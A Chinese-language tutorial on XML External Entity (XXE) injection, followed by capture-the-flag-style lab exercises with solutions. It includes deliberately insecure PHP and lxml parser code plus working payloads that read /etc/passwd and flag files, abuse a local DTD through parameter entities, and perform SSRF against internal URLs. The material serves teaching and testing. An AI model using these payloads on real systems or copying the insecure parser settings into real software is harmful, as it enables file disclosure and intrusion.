# XML 外部实体 (XXE)

当 XML 解析器被允许解析外部实体，且应用程序解析不受信任的 XML 时，就会发生 XML 外部实体（XXE）攻击。外部实体是一个占位符，它指示解析器在解析时从文件或 URL 获取数据。如果启用了该功能，攻击者就可以让服务器读取本地文件或联系内部服务。

在实际应用中，XXE 的产生需要满足两个条件：
1) 应用程序解析攻击者控制的 XML；
2) 解析器被配置为允许 DTD 和实体扩展。

其影响取决于解析器可以访问的内容。最常见的后果是读取本地文件（例如 `/etc/passwd`）、对内部端点进行服务器端请求伪造（SSRF），有时还会通过大量实体扩展导致拒绝服务。

## 示例

假设以下 PHP 代码在启用了外部实体的配置下解析用户提供的 XML。

```php
<?php
$xml = $_POST['xml'];
$doc = new DOMDocument();

// 不安全：启用了外部实体
$doc->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);

echo $doc->saveXML();
?>
```

危险的部分在于 `LIBXML_DTDLOAD`（允许 DTD）和 `LIBXML_NOENT`（扩展实体）的组合。如果攻击者控制了 XML 请求体，他们就可以声明一个外部实体并在文档内部引用它。例如，以下 payload 会从服务器读取 `/etc/passwd`：

```xml
<?xml version="1.0"?>
<!DOCTYPE request [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<request>
    <username>alice</username>
    <comment>&xxe;</comment>
</request>
```

当解析器扩展 `&xxe;` 时，文件内容会被注入到 XML 树中。简化的响应可能如下所示：

```xml
<request>
    <username>alice</username>
    <comment>root:x:0:0:root:/root:/bin/bash</comment>
</request>
```

外部实体也可以指向内部 URL，从而将 XXE 转化为 SSRF。解析器将发起 HTTP 请求并将响应注入到 XML 树中：

```xml
<?xml version="1.0"?>
<!DOCTYPE request [
    <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
]>
<request>
    <username>alice</username>
    <comment>&xxe;</comment>
</request>
```

## 训练

### XXE #1 - Basic File Read 

Basic File Read

Try to read the contents of `/tmp/flag.txt` using XML External Entity (XXE) injection.

code

```py
import io, os
from urllib.parse import unquote
from jinja2 import Environment, FileSystemLoader

template = Environment(
    autoescape=False,
    loader=FileSystemLoader('/tmp/templates'),
)
os.chdir('/tmp')

lxml = import_v("lxml", "5.3.2")
from lxml import etree

def main():
    data = unquote("§输入 input§")
    
    message = ""
    error = ""
    
    if not data:
        error = "No XML data received."
    else:
        try:
            # 启用 DTD 与实体替换
            parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
            tree = etree.parse(io.StringIO(data), parser)
            root = tree.getroot()
            
            message = "Parsed result:\n"
            for elem in root.iter():
                if elem.text:
                    message += elem.text + "\n"
        except Exception as e:
            error = "Parsing error: " + str(e)
    
    print(template.get_template('index.html').render(error=error, message=message))

main()
```

输入

```xml
<?xml version="1.0"?>
<!DOCTYPE fooroot [
    <!ENTITY xxe SYSTEM "/tmp/flag.txt">
]>
<fooroot>
    <bar>&xxe;</bar>
</fooroot>
```

### XXE #2 - Config Leak 

Config Leak

This challenge contains a local DTD file. Exploit it to read `/tmp/flag.txt`.

code

```py
...

with open('/tmp/app.config', 'w') as f:
    f.write('<!ENTITY % wrap "<!ENTITY data SYSTEM \'%file;\'>"> %wrap;')

def main():
    data = unquote("§输入 input§")
    
    ...

main()
```

输入

```xml
<?xml version="1.0"?>
<!DOCTYPE fooroot [
    <!ENTITY % file "/tmp/flag.txt">
    <!ENTITY % localdtd SYSTEM "/tmp/app.config">
    %localdtd;
]>
<fooroot>&data;</fooroot>
``` 
- 设置参数实体 `file` 为 flag 文件
- 继续使用参数实体加载本地 dtd 并替换
- 此时使用普通实体 `data` 即得到文件

code

```py
class Handler(socketserver.BaseRequestHandler):

        content = f"AWS_SECRET_KEY={flag}"
        response = f"HTTP/1.1 200 OK\r\nContent-Length: {len(content)}\r\n\r\n{content}".encode()
        self.request.sendall(response)

server = socketserver.TCPServer(('127.0.0.1', 8000), Handler)
threading.Thread(target=server.serve_forever, daemon=True).start()

def main():
    data = unquote("§输入 input§")
    ...

main()
```

输入

```xml
<?xml version="1.0"?>
<!DOCTYPE fooroot [
    <!ENTITY xxe SYSTEM "http://127.0.0.1:8000/">
]>
<fooroot>&xxe;</fooroot>
```
- 设置协议为 HTTP，而非默认的本地文件
